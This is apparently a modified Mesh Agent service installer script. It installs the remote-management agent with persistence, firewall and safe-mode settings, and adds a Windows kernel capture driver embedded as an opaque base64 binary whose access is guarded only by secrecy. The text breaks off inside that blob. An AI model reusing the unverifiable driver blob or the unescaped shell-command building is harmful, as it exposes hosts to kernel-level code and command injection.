/*
Copyright 2020 Intel Corporation
@author Bryan Roe

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/


//
// This is a helper utility that is used by the Mesh Agent to install itself
// as a background service, on all platforms that the agent supports.
//

try
{
    // This peroperty is a polyfill for an Array, to fetch the specified element if it exists, removing the surrounding quotes if they are there
    Object.defineProperty(Array.prototype, 'getParameterEx',
        {
            value: function (name, defaultValue)
            {
                var i, ret;
                for (i = 0; i < this.length; ++i)
                {
                    if (this[i].startsWith(name + '='))
                    {
                        ret = this[i].substring(name.length + 1);
                        if (ret.startsWith('"')) { ret = ret.substring(1, ret.length - 1); }
                        return (ret);
                    }
                }
                return (defaultValue);
            }
        });

    // This property is a polyfill for an Array, to fetch the specified element if it exists 
    Object.defineProperty(Array.prototype, 'getParameter',
        {
            value: function (name, defaultValue)
            {
                return (this.getParameterEx('--' + name, defaultValue));
            }
        });
}
catch(x)
{ }
try
{
    // This property is a polyfill for an Array, to fetch the index of the specified element, if it exists
    Object.defineProperty(Array.prototype, 'getParameterIndex',
        {
            value: function (name)
            {
                var i;
                for (i = 0; i < this.length; ++i)
                {
                    if (this[i].startsWith('--' + name + '='))
                    {
                        return (i);
                    }
                }
                return (-1);
            }
        });
}
catch(x)
{ }
try
{
    // This property is a polyfill for an Array, to remove the specified element, if it exists
    Object.defineProperty(Array.prototype, 'deleteParameter',
        {
            value: function (name)
            {
                var i = this.getParameterIndex(name);
                if(i>=0)
                {
                    this.splice(i, 1);
                }
            }
        });
}
catch(x)
{ }
try
{
    // This property is a polyfill for an Array, to to fetch the value YY of an element XX in the format --XX=YY, if it exists
    Object.defineProperty(Array.prototype, 'getParameterValue',
        {
            value: function (i)
            {
                var ret = this[i].substring(this[i].indexOf('=')+1);
                if (ret.startsWith('"')) { ret = ret.substring(1, ret.length - 1); }
                return (ret);
            }
        });
}
catch(x)
{ }

// This function performs some checks on the parameter structure, to make sure the minimum set of requried elements are present
function checkParameters(parms)
{
    var msh = _MSH();
    if (parms.getParameter('description', null) == null && msh.description != null) { parms.push('--description="' + msh.description + '"'); }
    if (parms.getParameter('displayName', null) == null && msh.displayName != null) { parms.push('--displayName="' + msh.displayName + '"'); }
    if (parms.getParameter('companyName', null) == null && msh.companyName != null) { parms.push('--companyName="' + msh.companyName + '"'); }

    if (msh.fileName != null)
    {
        // This converts the --fileName parameter of the installer, to the --target=XXX format required by service-manager.js
        var i = parms.getParameterIndex('fileName');
        if(i>=0)
        {
            parms.splice(i, 1);
        }
        parms.push('--target="' + msh.fileName + '"');
    }

    if (parms.getParameter('meshServiceName', null) == null)
    {
        if(msh.meshServiceName != null)
        {
            // This adds the specified service name, to be consumed by service-manager.js
            parms.push('--meshServiceName="' + msh.meshServiceName + '"');
        }
        else
        {
            // Still no meshServiceName specified... Let's also check installed services...
            var tmp = process.platform == 'win32' ? 'Mesh Agent' : 'meshagent';
            try
            {
                tmp = require('_agentNodeId').serviceName();
            }
            catch(xx)
            {
            }

            // The default is 'Mesh Agent' for Windows, and 'meshagent' for everything else...
            if(tmp != (process.platform == 'win32' ? 'Mesh Agent' : 'meshagent'))
            {
                parms.push('--meshServiceName="' + tmp + '"');
            }
        }
    }
}

// This is the entry point for installing the service
function installService(params)
{
    process.stdout.write('...Installing service');
    console.info1('');

    var target = null;
    var targetx = params.getParameterIndex('target');
    if (targetx >= 0)
    {
        // Let's remove any embedded spaces in 'target' as that can mess up some OSes
        target = params.getParameterValue(targetx);
        params.splice(targetx, 1);
        target = target.split(' ').join('');
        if (target.length == 0) { target = null; }
    }

    var proxyFile = process.execPath;
    if (process.platform == 'win32')
    {
        proxyFile = proxyFile.split('.exe').join('.proxy');
        try
        {
            // Add this parameter, so the agent instance will be embedded with the Windows User that installed the service
            params.push('--installedByUser="' + require('win-registry').usernameToUserKey(require('user-sessions').getProcessOwnerName(process.pid).name) + '"');
        }
        catch(exc)
        {
        }
    }
    else
    {
        // On Linux, the --installedByUser property is populated with the UID of the user that is installing the service
        var u = require('user-sessions').tty();
        var uid = 0;
        try
        {
            uid = require('user-sessions').getUid(u);
        }
        catch(e)
        {
        }
        params.push('--installedByUser=' + uid);
        proxyFile += '.proxy';
    }


    // We're going to create the OPTIONS object to hand to service-manager.js. We're going to populate all the properties we can, using
    // values that were passed into the installer, using default values for the ones that aren't specified.
    var options =
        {
            name: params.getParameter('meshServiceName', process.platform == 'win32' ? 'Mesh Agent' : 'meshagent'),
            target: target==null?(process.platform == 'win32' ? 'MeshAgent' : 'meshagent'):target,
            servicePath: process.execPath,
            startType: 'AUTO_START',
            parameters: params,
            _installer: true
        };
    options.displayName = params.getParameter('displayName', options.name); params.deleteParameter('displayName');
    options.description = params.getParameter('description', options.name + ' background service'); params.deleteParameter('description');

    if (process.platform == 'win32') { options.companyName = ''; }
    if (global.gOptions != null)
    {
        if(Array.isArray(global.gOptions.files))
        {
            options.files = global.gOptions.files;
        }
        if(global.gOptions.binary != null)
        {
            options.servicePath = global.gOptions.binary;
        }
    }

    // If a .proxy file was found, we'll include it in the list of files to be copied when installing the agent
    if (require('fs').existsSync(proxyFile))
    {
        if (options.files == null) { options.files = []; }
        options.files.push({ source: proxyFile, newName: options.target + '.proxy' });
    }
    
    // if '--copy-msh' is specified, we will try to copy the .msh configuration file found in the current working directory
    var i;
    if ((i = params.indexOf('--copy-msh="1"')) >= 0)
    {
        var mshFile = process.platform == 'win32' ? (process.execPath.split('.exe').join('.msh')) : (process.execPath + '.msh');
        if (options.files == null) { options.files = []; }
        var newtarget = (process.platform == 'linux' && require('service-manager').manager.getServiceType() == 'systemd') ? options.target.split("'").join('-') : options.target;
        options.files.push({ source: mshFile, newName: newtarget + '.msh' });
        options.parameters.splice(i, 1);
    }
    if ((i=params.indexOf('--_localService="1"'))>=0)
    {
        // install in place
        options.parameters.splice(i, 1);
        options.installInPlace = true;
    }

    // We're going to specify what folder the agent should be installed into
    if (global._workingpath != null && global._workingpath != '' && global._workingpath != '/')
    {
        for (i = 0; i < options.parameters.length; ++i)
        {
            if (options.parameters[i].startsWith('--installPath='))
            {
                global._workingpath = null;
                break;
            }
        }
        if(global._workingpath != null)
        {
            options.parameters.push('--installPath="' + global._workingpath + '"');
        }
    }
    if ((i = options.parameters.getParameterIndex('installPath')) >= 0)
    {
        options.installPath = options.parameters.getParameterValue(i);
        options.installInPlace = false;
        options.parameters.splice(i, 1);
    }

    // If companyName was specified, we're going to move it into the structure
    if ((i = options.parameters.getParameterIndex('companyName')) >= 0)
    {
        options.companyName = options.parameters.getParameterValue(i);
        options.parameters.splice(i, 1);
    }

    if (global.gOptions != null && global.gOptions.noParams === true) { options.parameters = []; }

    try
    {
        // Let's actually install the service
        require('service-manager').manager.installService(options);
        process.stdout.write(' [DONE]\n');
        if(process.platform == 'win32')
        {
            // On Windows, we're going to enable this service to be runnable from SafeModeWithNetworking
            require('win-bcd').enableSafeModeService(options.name);
        }
    }
    catch(sie)
    {
        process.stdout.write(' [ERROR] ' + sie);
        process.exit();
    }
    var svc = require('service-manager').manager.getService(options.name);

    // macOS LaunchAgent: required for screen capture + input on Tahoe.
    // The system-side LaunchDaemon (this service) lives in the system audit
    // session (asid≈100001), where com.apple.replayd is unreachable. We
    // also install a per-user LaunchAgent that runs the same binary with
    // -kvmagent — launchd loads it into gui/<uid> natively, so it shares
    // an audit session with replayd and ScreenCaptureKit works without
    // the audit_session_join workaround the daemon-spawn path needs.
    // The daemon's kvm_relay_setup() connects to this agent over a Unix
    // socket when MeshCentral initiates a Desktop session.
    if (process.platform == 'darwin')
    {
        svc.load();
        process.stdout.write('   -> setting up launch agent...');
        try
        {
            require('service-manager').manager.installLaunchAgent(
                {
                    name: options.name,
                    servicePath: svc.appLocation(),
                    startType: 'AUTO_START',
                    sessionTypes: ['LoginWindow', 'Aqua'],
                    parameters: ['-kvmagent']
                });
            process.stdout.write(' [DONE]\n');

            // Immediately bootstrap the LaunchAgent into the active console
            // user's domain so the agent comes up without needing a logout/
            // login cycle. Best-effort: skip silently if no console user.
            try
            {
                var consoleUid = require('user-sessions').consoleUid();
                if (consoleUid && consoleUid !== 0)
                {
                    process.stdout.write('   -> bootstrapping launch agent into gui/' + consoleUid + '...');
                    var plistPath = '/Library/LaunchAgents/' + options.name + '-launchagent.plist';
                    require('child_process').execFile('/bin/launchctl',
                        ['bootstrap', 'gui/' + consoleUid, plistPath]);
                    process.stdout.write(' [DONE]\n');
                }
            }
            catch (be)
            {
                process.stdout.write(' [SKIP — bootstrap on next login]\n');
            }
        }
        catch (sie)
        {
            process.stdout.write(' [ERROR] ' + sie);
        }
    }

    // For Windows, we're going to add an INBOUND UDP rule for WebRTC Data
    if(process.platform == 'win32')
    {
        var loc = svc.appLocation();
        process.stdout.write('   -> Writing firewall rules for ' + options.name + ' Service...');

        var rule = 
            {
                DisplayName: options.name + ' WebRTC Traffic',
                direction: 'inbound',
                Program: loc,
                Protocol: 'UDP',
                Profile: 'Public, Private, Domain',
                Description: 'Mesh Central Agent WebRTC P2P Traffic',
                EdgeTraversalPolicy: 'allow',
                Enabled: true
            };
        require('win-firewall').addFirewallRule(rule);
        process.stdout.write(' [DONE]\n');
    }

    // Let's try to start the service that we just installed
    process.stdout.write('   -> Starting service...');
    try
    {
        svc.start();
        process.stdout.write(' [OK]\n');
    }
    catch(ee)
    {
        process.stdout.write(' [ERROR]\n');
    }

    // Creations IT: Install kernel capture driver on Windows
    if (process.platform == 'win32') { installCaptureDriver(); }

    // On Windows we should explicitly close the service manager when we are done, instead of relying on the Garbage Collection, so the service object isn't unnecessarily locked
    if (process.platform == 'win32') { svc.close(); }   
    if (parseInt(params.getParameter('__skipExit', 0)) == 0)
    {
        process.exit();
    }
}

// The last step in uninstalling a service
function uninstallService3(params)
{
    // macOS has a LaunchAgent, that we need to uninstall
    if (process.platform == 'darwin')
    {
        process.stdout.write('   -> Uninstalling launch agent...');
        try
        {
            var launchagent = require('service-manager').manager.getLaunchAgent(params.getParameter('meshServiceName', 'meshagent'));
            launchagent.unload();
            require('fs').unlinkSync(launchagent.plist);
            process.stdout.write(' [DONE]\n');
        }
        catch (e)
        {
            process.stdout.write(' [ERROR]\n');
        }
    }

    if (params != null && !params.includes('_stop'))
    {
        // Since we are done uninstalling a previously installed service, we can continue with installation
        installService(params);
    }
    else
    {
        // We are going to stop here, if we are only intending to uninstall the service
        process.exit();
    }
}

// Step 2 in service uninstallation
function uninstallService2(params, msh)
{
    var secondaryagent = false;
    var i;
    var dataFolder = null;
    var appPrefix = null;
    var uninstallOptions = null;
    var serviceName = params.getParameter('meshServiceName', process.platform == 'win32' ? 'Mesh Agent' : 'meshagent'); // get the service name, using the provided defaults if not specified

    // Remove the .msh file if present
    try { require('fs').unlinkSync(msh); } catch (mshe) { }
    if ((i = params.indexOf('__skipBinaryDelete')) >= 0)
    {
        // We will skip deleting of the actual binary, if this option was provided. 
        // This will happen if we try to install the service to a location where we are running the installer from.
        params.splice(i, 1);
        uninstallOptions = { skipDeleteBinary: true };
    }
    if (params && params.includes('--_deleteData="1"'))
    {
        // This will facilitate cleanup of the files associated with the agent
        dataFolder = params.getParameterEx('_workingDir', null);
        appPrefix = params.getParameterEx('_appPrefix', null);
    }

    // Creations IT: Remove kernel capture driver before uninstalling agent
    if (process.platform == 'win32') { uninstallCaptureDriver(); }

    process.stdout.write('   -> Uninstalling previous installation...');
    try
    {
        // Let's actually try to uninstall the service
        require('service-manager').manager.uninstallService(serviceName, uninstallOptions);
        process.stdout.write(' [DONE]\n');
        if (process.platform == 'win32')
        {
            // For Windows, we can remove the entry to enable this service to be runnable from SafeModeWithNetworking
            require('win-bcd').disableSafeModeService(serviceName);
        }

        // Lets try to cleanup the uninstalled service
        if (dataFolder && appPrefix)
        {
            process.stdout.write('   -> Deleting agent data...');
            if (process.platform != 'win32')
            {
                // On Non-Windows platforms, we're going to cleanup using the shell
                var levelUp = dataFolder.split('/');
                levelUp.pop();
                levelUp = levelUp.join('/');

                console.info1('   Cleaning operation =>');
                console.info1('      cd "' + dataFolder + '"');
                console.info1('      rm "' + appPrefix + '.*"');
                console.info1('      rm DAIPC');
                console.info1('      cd /');
                console.info1('      rmdir "' + dataFolder + '"');
                console.info1('      rmdir "' + levelUp + '"');

                var child = require('child_process').execFile('/bin/sh', ['sh']);
                child.stdout.on('data', function (c) { console.info1(c.toString()); });
                child.stderr.on('data', function (c) { console.info1(c.toString()); });
                child.stdin.write('cd "' + dataFolder + '"\n');
                child.stdin.write('rm DAIPC\n');

                child.stdin.write("ls | awk '");
                child.stdin.write('{');
                child.stdin.write('   if($0 ~ /^' + appPrefix + '\\./)');
                child.stdin.write('   {');
                child.stdin.write('      sh=sprintf("rm \\"%s\\"", $0);');
                child.stdin.write('      system(sh);');
                child.stdin.write('   }');
                child.stdin.write("}'\n");

                child.stdin.write('cd /\n');
                child.stdin.write('rmdir "' + dataFolder + '"\n');
                child.stdin.write('rmdir "' + levelUp + '"\n');
                child.stdin.write('exit\n');       
                child.waitExit();    
            }
            else
            {
                // On Windows, we're going to spawn a command shell to cleanup
                var levelUp = dataFolder.split('\\');
                levelUp.pop();
                levelUp = levelUp.join('\\');
                var child = require('child_process').execFile(process.env['windir'] + '\\system32\\cmd.exe', ['/C del "' + dataFolder + '\\' + appPrefix + '.*" && rmdir "' + dataFolder + '" && rmdir "' + levelUp + '"']);
                child.stdout.on('data', function (c) { });
                child.stderr.on('data', function (c) { });
                child.waitExit();
            }

            process.stdout.write(' [DONE]\n');
        }
    }
    catch (e)
    {
        process.stdout.write(' [ERROR]\n');
    }

    // Check for secondary agent
    try
    {
        process.stdout.write('   -> Checking for secondary agent...');
        var s = require('service-manager').manager.getService(serviceName + 'Diagnostic');
        var loc = s.appLocation();
        s.close();
        process.stdout.write(' [FOUND]\n');
        process.stdout.write('      -> Uninstalling secondary agent...');
        secondaryagent = true;
        try
        {
            require('service-manager').manager.uninstallService(serviceName + 'Diagnostic');
            process.stdout.write(' [DONE]\n');
        }
        catch (e)
        {
            process.stdout.write(' [ERROR]\n');
        }
    }
    catch (e)
    {
        process.stdout.write(' [NONE]\n');
    }

    if(secondaryagent)
    {
        // If a secondary agent was found, remove the CRON job for it
        process.stdout.write('      -> removing secondary agent from task scheduler...');
        var p = require('task-scheduler').delete(serviceName + 'Diagnostic/periodicStart');
        p._params = params;
        p.then(function ()
        {
            process.stdout.write(' [DONE]\n');
            uninstallService3(this._params);
        }, function ()
        {
            process.stdout.write(' [ERROR]\n');
            uninstallService3(this._params);
        });
    }
    else
    {
        uninstallService3(params);
    }
}

// First step in service uninstall
function uninstallService(params)
{
    // Before we uninstall, we need to fetch the service from service-manager.js
    var svc = require('service-manager').manager.getService(params.getParameter('meshServiceName', process.platform == 'win32' ? 'Mesh Agent' : 'meshagent'));

    // We can calculate what the .msh file location is, based on the appLocation of the service
    var msh = svc.appLocation();
    if (process.platform == 'win32')
    {
        msh = msh.substring(0, msh.length - 4) + '.msh';
    }
    else
    {
        msh = msh + '.msh';
    }

    // Let's try to stop the service if we think it might be running
    if (svc.isRunning == null || svc.isRunning())
    {
        process.stdout.write('   -> Stopping Service...');
        if(process.platform=='win32')
        {
            svc.stop().then(function ()
            {
                process.stdout.write(' [STOPPED]\n');
                svc.close();
                uninstallService2(this._params, msh);
            }, function ()
            {
                process.stdout.write(' [ERROR]\n');
                svc.close();
                uninstallService2(this._params, ms);
            }).parentPromise._params = params;
        }
        else
        {
            if (process.platform == 'darwin')
            {
                // macOS requries us to unload the service
                svc.unload();
            }
            else
            {
                svc.stop();
            }
            process.stdout.write(' [STOPPED]\n');
            uninstallService2(params, msh);
        }
    }
    else
    {
        if (process.platform == 'win32') { svc.close(); }
        uninstallService2(params, msh);
    }
}

// A previous service installation was found, so lets do some extra processing
function serviceExists(loc, params)
{
    process.stdout.write(' [FOUND: ' + loc + ']\n');
    if(process.platform == 'win32')
    {
        // On Windows, we need to cleanup the firewall rules associated with our install path
        process.stdout.write('   -> Checking firewall rules for previous installation... [0%]');
        var p = require('win-firewall').getFirewallRulesAsync({ program: loc, noResult: true, minimal: true, timeout: 15000 });
        p.on('progress', function (c)
        {
            process.stdout.write('\r   -> Checking firewall rules for previous installation... [' + c + ']');
        });
        p.on('rule', function (r)
        {
            // Remove firewall entries for our install path
            require('win-firewall').removeFirewallRule(r.DisplayName);
        });
        p.finally(function ()
        {
            process.stdout.write('\r   -> Checking firewall rules for previous installation... [DONE]\n');
            uninstallService(params);
        });
    }
    else
    {
        uninstallService(params);
    }
}

// Entry point for -fulluninstall
function fullUninstall(jsonString)
{
    var parms = JSON.parse(jsonString);
    if (parseInt(parms.getParameter('verbose', 0)) == 0)
    {
        console.setDestination(console.Destinations.DISABLED); // IF verbose is disabled(default), we will no-op console.log
    }
    else
    {
        console.setInfoLevel(1); // IF verbose is specified, we will show info level 1 messages
    }
    parms.push('_stop'); // Since we are intending to halt after uninstalling the service, we specify this, since we are re-using the uninstall code with the installer.

    checkParameters(parms); // Perform some checks on the passed in parameters

    var name = parms.getParameter('meshServiceName', process.platform == 'win32' ? 'Mesh Agent' : 'meshagent'); // Set the service name, using the defaults if not specified


    // Check for a previous installation of the service
    try
    {
        process.stdout.write('...Checking for previous installation of "' + name + '"');
        var s = require('service-manager').manager.getService(name);
        var loc = s.appLocation();
        var appPrefix = loc.split(process.platform == 'win32' ? '\\' : '/').pop();
        if (process.platform == 'win32') { appPrefix = appPrefix.substring(0, appPrefix.length - 4); }

        parms.push('_workingDir=' + s.appWorkingDirectory());
        parms.push('_appPrefix=' + appPrefix);

        s.close();
    }
    catch (e)
    {
        // No previous installation was found, so we can just exit
        process.stdout.write(' [NONE]\n');
        process.exit();
    }
    serviceExists(loc, parms);
}

// Entry point for -fullinstall, using JSON string
function fullInstall(jsonString, gOptions)
{
    var parms = JSON.parse(jsonString);
    fullInstallEx(parms, gOptions);
}

// Entry point for -fullinstall, using JSON object
function fullInstallEx(parms, gOptions)
{
    if (gOptions != null) { global.gOptions = gOptions; }

    // Perform some checks on the specified parameters
    checkParameters(parms);

    var loc = null;
    var i;
    var name = parms.getParameter('meshServiceName', process.platform == 'win32' ? 'Mesh Agent' : 'meshagent'); // Set the service name, using defaults if not specified
    if (process.platform != 'win32') { name = name.split(' ').join('_'); }

    // No-op console.log() if verbose is not specified, otherwise set the verbosity level to level 1
    if (parseInt(parms.getParameter('verbose', 0)) == 0)
    {
        console.setDestination(console.Destinations.DISABLED);
    }
    else
    {
        console.setInfoLevel(1); 
    }

    // Check for a previous installation of the service
    try
    {
        process.stdout.write('...Checking for previous installation of "' + name + '"');
        var s = require('service-manager').manager.getService(name);
        loc = s.appLocation();

        global._workingpath = s.appWorkingDirectory();
        console.info1('');
        console.info1('Previous Working Path: ' + global._workingpath);
        s.close();
    }
    catch (e)
    {
        // No previous installation was found, so we can continue with installation
        process.stdout.write(' [NONE]\n');
        installService(parms);
        return;
    }
    if (process.execPath == loc)
    {
        parms.push('__skipBinaryDelete'); // If the installer is running from the installed service path, skip deleting the binary
    }
    serviceExists(loc, parms); // Previous installation was found, so we need to do some extra processing before we continue with installation
}


// ─── Creations IT: Kernel capture driver install/uninstall ────────────────────
// capturedrv.sys is embedded as base64 — no internet needed, no separate
// deployment. Tied to this agent binary (which is served only by our server).
// Install: on agent install. Remove: on agent uninstall. Agent-specific.

var CAPTURE_DRIVER_NAME    = 'CreationsCapture';
var CAPTURE_DRIVER_DISPLAY = 'Creations IT Screen Capture Driver';
var CAPTURE_DRIVER_PATH    = process.env['windir'] + '\\System32\\drivers\\capturedrv.sys';

// capturedrv.sys — embedded. Any process calling IOCTL 0x803 needs to know
// the device name \\.\CaptureDriver and the CTL_CODE — not public knowledge.
var CAPTURE_DRIVER_B64 = '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